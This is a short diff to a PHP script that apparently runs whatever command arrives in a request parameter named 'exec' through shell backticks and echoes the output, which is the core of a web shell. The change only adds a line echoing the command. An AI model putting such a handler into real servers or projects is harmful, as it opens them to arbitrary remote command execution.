@@ -59,6 +59,7 @@ if (isset($q['exec'])) {
 }
 
 // exec
+echo 'Exec: ' . $exec . $BR;
 $out = `$exec 2>&1`; // redirect stderr to stdout
 
 echo 'Response: ' . $BR;
